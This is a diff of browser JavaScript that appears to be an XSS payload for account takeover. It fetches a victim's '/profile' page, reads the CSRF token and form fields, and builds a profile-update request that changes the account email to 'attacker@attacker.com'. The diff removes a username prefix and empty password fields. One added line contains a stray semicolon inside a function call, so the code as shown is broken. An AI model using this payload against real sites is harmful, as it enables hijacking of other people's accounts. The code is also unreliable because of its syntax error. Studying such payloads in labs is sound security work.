@@ -5,17 +5,13 @@ fetch('/profile')
     const doc = parser.parseFromString(html, 'text/html');
 
     const csrfToken = doc.querySelector('input[name="csrf_token"]').value;
-    const username = 'aaa' + doc.querySelector('input[name="username"]').value;
     
     const params = new URLSearchParams();
     params.append('csrf_token', csrfToken);
-    params.append('username', username);
+    params.append('username', doc.querySelector('input[name="username"]').value;);
     params.append('firstname', doc.querySelector('input[name="firstname"]').value);
     params.append('lastname', doc.querySelector('input[name="lastname"]').value);
     params.append('email', 'attacker@attacker.com');
-    params.append('oldpassword', '');
-    params.append('password', '');
-    params.append('passwordCheck' , '');
     params.append('submit', 'Submit');
     
 
